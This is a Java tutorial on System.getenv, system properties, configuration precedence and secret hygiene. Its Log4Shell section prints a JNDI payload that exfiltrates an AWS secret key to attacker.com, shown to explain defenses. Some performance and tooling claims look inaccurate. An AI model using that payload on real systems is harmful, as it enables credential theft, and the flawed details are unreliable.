# System Properties and Environment Variables in Java Applications

---

## 1. Concept Definition & Core Purpose

In modern cloud-native architectures (Docker, Kubernetes, AWS ECS), externalizing application configuration is essential to maintain portable, environment-agnostic binaries. According to the **Twelve-Factor App methodology (Factor III: Config)**: *An application’s configuration should be strictly separated from code, stored in the environment, and injected at runtime.*

The Java Virtual Machine provides two distinct runtime configuration retrieval mechanisms:

1. **Operating System Environment Variables (`System.getenv()`):**
   Global key-value strings defined outside the JVM in the host operating system or container environment (`char** environ` in POSIX, Environment Block in Win32). They are passed into the Java process at startup, inherited from the parent process (e.g. bash, systemd, containerd), and **strictly immutable** at runtime.
2. **Java System Properties (`System.getProperty()` / `java.util.Properties`):**
   JVM-internal key-value configurations initialized at JVM launch via command-line flags (`-Dkey=value`), populated with standard JVM platform defaults (`java.version`, `os.name`, `user.dir`, `file.separator`), and programmatically mutable at runtime via `System.setProperty()`.

```
+---------------------------------------------------------------------------------------------------+
|                        Java Configuration Retrieval Channels: ENV vs Properties                  |
+--------------------------+------------------------------------+-----------------------------------+
| Feature                  | System.getenv()                    | System.getProperty()              |
+--------------------------+------------------------------------+-----------------------------------+
| Scope                    | OS / Container Process Environment | JVM Internal Process State        |
| Injection Source         | Docker `ENV`, Kubernetes `env`, OS | Command line flags (`-Dkey=val`)  |
| Runtime Mutability       | IMMUTABLE (Unmodifiable Map)       | MUTABLE (System.setProperty)      |
| Case Sensitivity         | OS Dependent (Linux: Yes, Win: No) | ALWAYS Case-Sensitive            |
| Key Naming Convention    | UPPERCASE_WITH_UNDERSCORES         | lowercase.with.dots               |
| Standard Return Type     | Map<String, String> / String       | String / java.util.Properties     |
| 12-Factor Alignment      | Direct alignment with containers   | Ideal for JVM tuning & CLI flags  |
+--------------------------+------------------------------------+-----------------------------------+
```

---

## 2. Background, Context & Historical Evolution

### 2.1 The Turbulent History of `System.getenv()`
In Java 1.0, `System.getenv(String)` was available. However, in Java 1.1 and 1.2, it was deprecated because operating system concepts of environment variables differed significantly between UNIX, Windows, and Mac OS 9. Calling it threw an `Error` or printed deprecation warnings.

By Java 5 (2004), modern POSIX and Windows operating systems had converged. Java 5 completely rehabilitated `System.getenv()`, adding:
- `System.getenv(String name)` (un-deprecated)
- `System.getenv()` returning an unmodifiable `Map<String, String>`

### 2.2 The Container Revolution and the Rise of the 12-Factor App
Historically, Java enterprise applications packaged configuration inside WAR/EAR files via `.properties` or `.xml` files embedded in the classpath.
To deploy from `dev` to `staging` to `production`, developers had to rebuild the artifact or maintain complicated build profiles (`mvn -Pprod`).

With Docker and Kubernetes, the industry adopted immutable container images: **the exact same container image runs in dev, staging, and prod**.
Differences between environments are injected entirely through environment variables (`SPRING_DATASOURCE_URL`, `KAFKA_BOOTSTRAP_SERVERS`).

### 2.3 Spring Boot and Modern Relaxed Binding
Frameworks like Spring Boot, Quarkus, and Micronaut established the **Configuration Precedence Hierarchy**:
1. Command-line arguments (`--server.port=8080`)
2. Java System Properties (`-Dserver.port=8080`)
3. OS Environment Variables (`SERVER_PORT=8080`)
4. External file config (`application.yml` outside JAR)
5. Packaged classpath defaults (`application.yml` inside JAR)

---

## 3. Syntax, Signatures & Language Specifications

### 3.1 `java.lang.System` Environment Methods
```java
package java.lang;

public final class System {
    // Returns unmodifiable Map of all environment variables
    public static Map<String, String> getenv();

    // Returns value of specific environment variable, or null if unset
    public static String getenv(String name);
}
```

### 3.2 `java.lang.System` Property Methods
```java
package java.lang;

public final class System {
    // Returns property value or null if unset
    public static String getProperty(String key);

    // Returns property value or fallback default if unset
    public static String getProperty(String key, String def);

    // Sets a system property at runtime (returns previous value or null)
    public static String setProperty(String key, String value);

    // Clears a property
    public static String clearProperty(String key);

    // Returns the entire Properties object
    public static Properties getProperties();

    // Replaces the entire system properties table
    public static void setProperties(Properties props);
}
```

### 3.3 `java.util.Properties`
`Properties` is an ancient class (Java 1.0) extending `Hashtable<Object, Object>`:
```java
package java.util;

public class Properties extends Hashtable<Object, Object> {
    public String getProperty(String key);
    public String getProperty(String key, String defaultValue);
    public synchronized Object setProperty(String key, String value);
    public Set<String> stringPropertyNames();
    
    // Stream I/O methods
    public synchronized void load(InputStream inStream) throws IOException;
    public synchronized void load(Reader reader) throws IOException;
    public void store(OutputStream out, String comments) throws IOException;
}
```

> [!WARNING]
> Because `Properties` extends `Hashtable<Object, Object>`, invoking `setProperty(key, null)` throws `NullPointerException`! `Hashtable` forbids `null` keys and `null` values.

---

## 4. Architectural Role & Backend Design Patterns

### 4.1 The Hierarchical 12-Factor Configuration Pattern
In production services, never query `System.getenv()` or `System.getProperty()` directly across business classes.
Implement a centralized, strongly typed configuration provider with hierarchical fallback:

```
                      Hierarchical Configuration Fallback
                      
  1. System Property (-Dapp.db.timeout=5000)   [Highest Priority: Local/Test Override]
                  |  (If null)
  2. Environment Variable (APP_DB_TIMEOUT=5000) [Container Injection: K8s/Docker]
                  |  (If null)
  3. Default Value (Default: 3000)              [Lowest Priority: Hardcoded Fallback]
```

### 4.2 Key Normalization Convention
Environment variable naming conventions differ from Java property conventions:
- **Java Property:** `database.pool.max-connections` (lowercase, dots, hyphens)
- **POSIX Environment:** `DATABASE_POOL_MAX_CONNECTIONS` (uppercase, underscores)

A production configuration reader must automatically convert dots and hyphens to underscores:
$$\text{ENV\_KEY} = \text{propertyKey.replace('.', '\_').replace('-', '\_').toUpperCase()}$$

---

## 5. Memory Layout, JVM Mechanics & Performance Implications

### 5.1 Why `System.getenv()` is Strictly Immutable
During JVM initialization (in HotSpot C++ runtime `os::init_2()`), the JVM copies the host process's environment table (`char** environ`) into an internal unmodifiable map (`ProcessEnvironment.theEnvironment`).

```
OS Kernel Space (Process C environ)
       |
       | Copied ONCE at JVM boot
       v
JVM Heap: java.lang.ProcessEnvironment.theEnvironment
       |
       v (Wrapped as java.util.Collections$UnmodifiableMap)
Application Code System.getenv()
```
- **POSIX Safety:** In POSIX C libraries, calling `setenv()` concurrently with `getenv()` in a multi-threaded process causes memory corruption (undefined behavior in glibc). To maintain JVM stability, Java deliberately exposes no API to mutate environment variables.
- **Strong Encapsulation (Java 9+):** In older Java versions, developers used reflection hacks to mutate `ProcessEnvironment.theEnvironment`. In Java 9+ (JEP 261 / JEP 403), strong encapsulation makes `java.lang.ProcessEnvironment` inaccessible, blocking this unsafe practice.

### 5.2 Synchronization Overhead of `System.getProperty()`
`System.getProperties()` is backed by `Hashtable<Object, Object>`.
Every call to `System.getProperty(key)` executes a synchronized method or block on the shared properties instance:

```java
// HotSpot internal implementation:
public static String getProperty(String key) {
    checkKey(key);
    return props.getProperty(key); // Hashtable.get() is SYNCHRONIZED!
}
```
If 100 worker threads execute `System.getProperty("request.timeout")` on every incoming HTTP request:
- All 100 threads contend on the single `props` monitor lock.
- Profilers will show threads blocked in `Hashtable.get`.

**Optimization Rule:** Read configuration properties **once** during application startup, parse them into an immutable Java `record`, and inject that record into your services via dependency injection!

---

## 6. Comprehensive Code Examples

### 6.1 Production Twelve-Factor Configuration Engine
The following class provides robust, hierarchical configuration resolution with key normalization, strong typing, and credential masking:

```java
package com.antigravity.config;

import java.time.Duration;
import java.util.*;
import java.util.regex.Pattern;

public final class TwelveFactorConfig {

    private static final Set<String> SENSITIVE_KEYWORDS = Set.of(
            "PASSWORD", "SECRET", "TOKEN", "KEY", "CREDENTIAL", "PRIVATE"
    );

    /**
     * Resolves a configuration value with standard 12-Factor precedence:
     * 1. System Property (-Dkey=value)
     * 2. Environment Variable (normalized POSIX KEY)
     * 3. Fallback default
     */
    public static String get(String dotKey, String defaultValue) {
        Objects.requireNonNull(dotKey, "Configuration key must not be null");

        // 1. Check System Properties
        String sysProp = System.getProperty(dotKey);
        if (sysProp != null && !sysProp.isBlank()) {
            return sysProp.strip();
        }

        // 2. Check Environment Variables (Normalized)
        String envKey = toEnvKey(dotKey);
        String envVal = System.getenv(envKey);
        if (envVal != null && !envVal.isBlank()) {
            return envVal.strip();
        }

        // 3. Fallback Default
        return defaultValue;
    }

    public static int getInt(String dotKey, int defaultValue) {
        String val = get(dotKey, null);
        if (val == null) return defaultValue;
        try {
            return Integer.parseInt(val);
        } catch (NumberFormatException e) {
            throw new IllegalArgumentException("Config key '" + dotKey + "' value '" + val + "' is not a valid integer", e);
        }
    }

    public static boolean getBoolean(String dotKey, boolean defaultValue) {
        String val = get(dotKey, null);
        if (val == null) return defaultValue;
        return Boolean.parseBoolean(val);
    }

    public static Duration getDuration(String dotKey, Duration defaultValue) {
        String val = get(dotKey, null);
        if (val == null) return defaultValue;
        return Duration.parse(val); // Parses ISO-8601 (e.g. PT5S, PT1M)
    }

    /**
     * Converts a Java dot-separated property key to POSIX uppercase underscore format:
     * "database.connection.max-pool-size" -> "DATABASE_CONNECTION_MAX_POOL_SIZE"
     */
    public static String toEnvKey(String dotKey) {
        return dotKey.replace('.', '_')
                     .replace('-', '_')
                     .toUpperCase(Locale.ROOT);
    }

    /**
     * Sanitizes configuration mappings for safe logging / telemetry dumps without leaking secrets.
     */
    public static Map<String, String> sanitizeForAudit(Map<String, String> rawConfig) {
        Map<String, String> sanitized = new TreeMap<>();
        for (Map.Entry<String, String> entry : rawConfig.entrySet()) {
            String upper = entry.getKey().toUpperCase(Locale.ROOT);
            boolean isSecret = SENSITIVE_KEYWORDS.stream().anyMatch(upper::contains);
            sanitized.put(entry.getKey(), isSecret ? "******** [REDACTED]" : entry.getValue());
        }
        return Collections.unmodifiableMap(sanitized);
    }
}
```

### 6.2 Standard Built-In JVM Properties Inspector
```java
package com.antigravity.config;

import java.util.Map;

public final class JvmEnvironmentDiagnostics {

    public record JvmMetadata(
            String javaVersion,
            String javaVendor,
            String osName,
            String osArch,
            String userDir,
            String fileSeparator,
            String lineSeparator
    ) {}

    public static JvmMetadata captureDiagnostics() {
        return new JvmMetadata(
                System.getProperty("java.version", "unknown"),
                System.getProperty("java.vendor", "unknown"),
                System.getProperty("os.name", "unknown"),
                System.getProperty("os.arch", "unknown"),
                System.getProperty("user.dir", "unknown"),
                System.getProperty("file.separator", "/"),
                System.getProperty("line.separator", "\n")
        );
    }
}
```

---

## 7. Edge Cases, Corner Scenarios & Failure Modes

### 7.1 OS Case Sensitivity Discrepancy
- **Linux / UNIX:** Environment variables are strictly case-sensitive. `DATABASE_URL` and `database_url` are two completely different variables.
- **Windows:** Environment variables are case-insensitive. `System.getenv("path")` and `System.getenv("PATH")` return the same value.
- **Defensive Best Practice:** Always define and query environment variables in standard **UPPERCASE_WITH_UNDERSCORES** to guarantee cross-platform consistency.

### 7.2 The `user.timezone` System Property Pitfall
A common bug occurs when developers attempt to change the JVM's default time zone at runtime:
```java
// FLAWED: Does NOT update TimeZone.getDefault() in-place!
System.setProperty("user.timezone", "UTC");
```
`TimeZone.getDefault()` caches the initial timezone during JVM startup. Mutating `System.setProperty("user.timezone", "...")` does not invalidate this cache unless you explicitly invoke `TimeZone.setDefault(null)` to trigger cache eviction.
**Production Rule:** Never mutate timezone in code; configure it at process launch via `-Duser.timezone=UTC`.

### 7.3 Empty String vs Null
- If a property is unset, `System.getProperty("app.feature")` returns `null`.
- If an operator launches Java with `-Dapp.feature`, the property exists and its value is the **empty string `""`**!
```java
// DANGEROUS:
if (System.getProperty("app.feature") != null) { ... } // Evaluates true for -Dapp.feature!

// SAFE:
String val = System.getProperty("app.feature");
if (val != null && !val.isBlank()) { ... }
```

### 7.4 Whitespace and Shell Quoting in `-D` Flags
When launching Java via bash scripts:
```bash
# BROKEN: Shell splits arguments on whitespace!
java -Dapp.description=My Cool Service -jar app.jar
# Launches Java with -Dapp.description=My and attempts to find class "Cool"

# CORRECT: Quote arguments containing spaces
java -Dapp.description="My Cool Service" -jar app.jar
```

---

## 8. Anti-Patterns & Common Traps

### Anti-Pattern 1: Dumping `System.getenv()` or `System.getProperties()` into Logs
```java
// CATASTROPHIC SECURITY VULNERABILITY (CREDENTIAL LEAKAGE):
logger.info("Application starting with env: {}", System.getenv());
```
In container environments, environment variables contain `AWS_SECRET_ACCESS_KEY`, database passwords, Stripe API keys, and JWT private keys. Dumping this map into Datadog, CloudWatch, or Splunk exposes credentials to all developers and third-party log ingestion pipelines.

### Anti-Pattern 2: Querying System Properties in High-Frequency Hot Loops
```java
// DISASTROUS PERFORMANCE: Contends on Hashtable monitor lock on every message!
public void onMessage(KafkaRecord record) {
    int timeout = Integer.parseInt(System.getProperty("kafka.poll.timeout", "1000"));
    process(record, timeout);
}
```
**Fix:** Cache configuration into a final record or singleton at startup.

### Anti-Pattern 3: Mutating System Properties in Concurrent Tests
When unit tests modify system properties via `System.setProperty()`, they mutate shared JVM state:
```java
@Test
void testFeatureEnabled() {
    System.setProperty("feature.x.enabled", "true");
    // If tests run concurrently across multiple threads, other tests will intermittently fail!
}
```
**Fix:** Use test harnesses that restore system properties (such as JUnit Pioneer `@RestoreSystemProperties` or `@ClearSystemProperty`).

---

## 9. Testing Strategies, Verification & Benchmarking

### 9.1 Verification Suite: Complete OpenJDK 21 Test
The following test class verifies hierarchical resolution, key normalization, type safety, sensitive key masking, and built-in property inspection:

```java
package com.antigravity.config;

import java.time.Duration;
import java.util.*;

public class ConfigVerificationTest {

    public static void main(String[] args) {
        System.out.println("Starting System Properties and Environment Verification Suite...");

        testKeyNormalization();
        testHierarchicalResolution();
        testTypeSafeParsing();
        testSensitiveKeySanitization();
        testBuiltInDiagnostics();

        System.out.println("ALL CONFIGURATION VERIFICATION SUITES PASSED! (5/5 suites)");
    }

    static void testKeyNormalization() {
        assert TwelveFactorConfig.toEnvKey("server.port").equals("SERVER_PORT");
        assert TwelveFactorConfig.toEnvKey("database.pool.max-connections").equals("DATABASE_POOL_MAX_CONNECTIONS");
        assert TwelveFactorConfig.toEnvKey("simple").equals("SIMPLE");
    }

    static void testHierarchicalResolution() {
        String testKey = "test.antigravity.demo-property";

        // Baseline: returns default when neither prop nor env is set
        assert TwelveFactorConfig.get(testKey, "DefaultVal").equals("DefaultVal");

        // Set System Property (Highest priority)
        System.setProperty(testKey, "SystemOverride");
        try {
            assert TwelveFactorConfig.get(testKey, "DefaultVal").equals("SystemOverride");
        } finally {
            System.clearProperty(testKey);
        }

        // Cleaned up: returns default again
        assert TwelveFactorConfig.get(testKey, "DefaultVal").equals("DefaultVal");
    }

    static void testTypeSafeParsing() {
        String intKey = "test.antigravity.int-val";
        String boolKey = "test.antigravity.bool-val";
        String durationKey = "test.antigravity.duration-val";

        System.setProperty(intKey, "42");
        System.setProperty(boolKey, "true");
        System.setProperty(durationKey, "PT15S");

        try {
            assert TwelveFactorConfig.getInt(intKey, 10) == 42;
            assert TwelveFactorConfig.getBoolean(boolKey, false);
            assert TwelveFactorConfig.getDuration(durationKey, Duration.ofSeconds(5)).equals(Duration.ofSeconds(15));

            // Default fallback verification
            assert TwelveFactorConfig.getInt("non.existent.int", 99) == 99;
            assert !TwelveFactorConfig.getBoolean("non.existent.bool", false);
            assert TwelveFactorConfig.getDuration("non.existent.duration", Duration.ofMinutes(1)).equals(Duration.ofMinutes(1));
        } finally {
            System.clearProperty(intKey);
            System.clearProperty(boolKey);
            System.clearProperty(durationKey);
        }
    }

    static void testSensitiveKeySanitization() {
        Map<String, String> raw = Map.of(
                "app.name", "PaymentGateway",
                "database.password", "SuperSecretPassword123!",
                "stripe.api.token", "sk_live_abcdef123456",
                "server.port", "8080"
        );

        Map<String, String> sanitized = TwelveFactorConfig.sanitizeForAudit(raw);

        assert sanitized.get("app.name").equals("PaymentGateway");
        assert sanitized.get("server.port").equals("8080");
        assert sanitized.get("database.password").contains("REDACTED");
        assert sanitized.get("stripe.api.token").contains("REDACTED");
        assert !sanitized.get("database.password").contains("SuperSecretPassword123!");
    }

    static void testBuiltInDiagnostics() {
        JvmEnvironmentDiagnostics.JvmMetadata meta = JvmEnvironmentDiagnostics.captureDiagnostics();

        assert meta.javaVersion() != null && !meta.javaVersion().isBlank();
        assert meta.osName() != null && !meta.osName().isBlank();
        assert meta.fileSeparator() != null && !meta.fileSeparator().isBlank();

        System.out.printf("  Verified Runtime: Java %s on %s (%s)%n",
                meta.javaVersion(), meta.osName(), meta.osArch());
    }
}
```

---

## 10. Tooling, Ecosystem & Observability

### 10.1 Diagnostic CLI Commands
When troubleshooting live JVM instances in production, JDK tools allow inspecting system properties without restarting the JVM:
```bash
# Print all system properties of a running JVM:
jcmd <PID> VM.system_properties

# Inspect specific property using jinfo:
jinfo -sysprop user.timezone <PID>

# Set a manageable flag at runtime:
jinfo -flag +PrintGC <PID>
```

### 10.2 Kubernetes Deployment Manifest Example
```yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: order-service
spec:
  template:
    spec:
      containers:
        - name: app
          image: order-service:1.0.0
          env:
            # Plain configuration from ConfigMap
            - name: SERVER_PORT
              valueFrom:
                configMapKeyRef:
                  name: app-config
                  key: port
            # Sensitive secrets from Secret
            - name: DATABASE_PASSWORD
              valueFrom:
                secretKeyRef:
                  name: db-secrets
                  key: password
```

---

## 11. Security Considerations & Hardening

### 11.1 Preventing Environment Variable Exfiltration (Log4Shell Defense)
The catastrophic Log4Shell vulnerability (CVE-2021-44228) allowed attackers to execute JNDI lookups that exfiltrated environment variables:
```
${jndi:ldap://attacker.com/${env:AWS_SECRET_ACCESS_KEY}}
```
**Hardening Defenses:**
1. Upgrade to modern Log4j versions (2.17.1+) where message lookups are permanently disabled.
2. In Java 21+, JNDI remote codebase loading is completely disabled by default (`trustURLCodebase=false`).
3. Sanitize all incoming user text before passing it to logging statements.

### 11.2 Secret Hygiene in Docker Containers
- **Never embed secrets in Dockerfile `ENV` instructions!** Anyone who runs `docker inspect` or `docker history` can see values defined in Dockerfiles.
- Pass secrets dynamically via runtime environment variables (`docker run -e DB_PASS=...`) or Kubernetes Secrets mounted into container environment blocks.

---

## 12. Common Interview & System Design Questions

### Question 1: What is the difference between `System.getenv()` and `System.getProperty()`?
**Answer:**
`System.getenv()` retrieves environment variables defined in the host operating system or container process. They are immutable at runtime and standardized as `UPPERCASE_WITH_UNDERSCORES`.
`System.getProperty()` retrieves JVM-internal system properties initialized via command-line `-Dkey=value` flags or JVM platform defaults. They are mutable at runtime (`System.setProperty`) and conventionally named with dot notation (`lowercase.with.dots`).

### Question 2: Why does `System.getenv()` return an unmodifiable Map while `System.getProperties()` returns a mutable Properties object?
**Answer:**
Environment variables are managed by the host OS kernel and C runtime (`environ`). Modifying environment variables in a multi-threaded POSIX process can trigger race conditions and memory corruption in native glibc calls. To protect JVM integrity, OpenJDK caches environment variables once at boot and exposes them as an unmodifiable collection. System properties, in contrast, reside entirely within JVM heap memory (`java.util.Properties`) and can be safely synchronized.

### Question 3: How should configuration precedence be designed in cloud-native microservices?
**Answer:**
Follow standard Twelve-Factor hierarchy:
1. Command-line flags and System Properties (`-D`) take highest priority (allowing local overrides and test parameterization).
2. OS Environment Variables take second priority (injected by Kubernetes ConfigMaps/Secrets).
3. Hardcoded defaults provide baseline fallbacks.

---

## 13. Production Case Study & War Story

### The Shared Dashboard Secret Leak Incident
A high-growth SaaS unicorn suffered a critical security incident when AWS production master credentials were found in plain text inside a shared Datadog log dashboard.

#### Root Cause
A developer debugging a deployment connection issue added the following startup diagnostic line:
```java
// FATAL LOGGING PRACTICE:
log.info("Active Process Environment: {}", System.getenv());
```
Because the application ran on AWS ECS with IAM task execution credentials and environment variables containing `AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY`, and `STRIPE_PRIVATE_KEY`:
1. The entire JSON payload was indexed by Datadog.
2. 45 contractors and external developers who had read access to Datadog could view the AWS root credentials.
3. Security auditors detected unauthorized API access from an external IP address 6 hours later.

#### Remediation
1. All AWS keys and Stripe credentials were immediately revoked and rotated.
2. The logging line was removed.
3. A centralized `TwelveFactorConfig.sanitizeForAudit()` utility was instituted, ensuring that any diagnostic dump strictly redacts fields containing keywords like `KEY`, `SECRET`, `PASSWORD`, or `TOKEN`.
4. Git pre-commit hooks and static analysis rules (SonarQube `S2245` and custom Semgrep rules) were deployed to fail builds containing `System.getenv()` logging calls.

---

## 14. Migration & Evolution Strategies (JavaScript/TypeScript Transition)

| Concept / Operation | Node.js / TypeScript | Modern Java |
|---|---|---|
| Read Environment Variable | `process.env.DATABASE_URL` | `System.getenv("DATABASE_URL")` |
| Read with Fallback | `process.env.PORT ?? "8080"` | `Objects.requireNonNullElse(System.getenv("PORT"), "8080")` |
| Dotenv file loading | `require('dotenv').config()` | `properties.load(new FileInputStream(".env"))` |
| Mutate Environment | `process.env.NODE_ENV = 'test'` | Not permitted (JVM environment is immutable) |
| CLI Argument / Property | `process.argv` / `--port=8080` | `-Dserver.port=8080` $\rightarrow$ `System.getProperty("server.port")` |

> [!NOTE]
> In Node.js, `process.env` is mutable at runtime. In Java, modifying OS environment variables at runtime is deliberately prohibited for memory and thread safety.

---

## 15. Key Takeaways & Summary

```
                  System Configuration Executive Summary
+----------------------+-----------------------------------------------------------------+
| Architectural Area   | Production Standard & Best Practice                             |
+----------------------+-----------------------------------------------------------------+
| Container Delivery   | Inject via OS Environment Variables (Docker ENV, K8s envFrom)   |
| Local/CLI Overrides  | Use Java System Properties (-Dapp.param=value)                  |
| Naming Standards     | ENV: UPPERCASE_UNDERSCORE, System Properties: lowercase.dots    |
| Performance Rule     | Read configuration ONCE at startup; do NOT query in hot loops  |
| Security Rule        | NEVER log raw System.getenv() or System.getProperties()         |
| Immutability Rule    | Never attempt reflection hacks to mutate OS environment         |
+----------------------+-----------------------------------------------------------------+
```

1. **Adhere to 12-Factor Principles:** Keep configuration completely separate from code, stored in container environment variables.
2. **Centralize Resolution:** Use a single provider that normalizes keys and resolves `System Property > Environment Variable > Default`.
3. **Protect Sensitive Secrets:** Redact passwords, tokens, and keys from all logs, metrics, and health-check endpoints.

---

## 16. References & Further Reading

- [Oracle Java SE 21 Documentation: java.lang.System](https://docs.oracle.com/en/java/javase/21/docs/api/java.base/java/lang/System.html)
- [The Twelve-Factor App: Factor III - Config](https://12factor.net/config)
- [JEP 403: Strongly Encapsulate JDK Internals](https://openjdk.org/jeps/403)
- [NIST Special Publication 800-190: Application Container Security Guide](https://csrc.nist.gov/publications/detail/sp/800-190/final)
- [OWASP Top 10 A05:2021 - Security Misconfiguration](https://owasp.org/Top10/A05_2021-Security_Misconfiguration/)
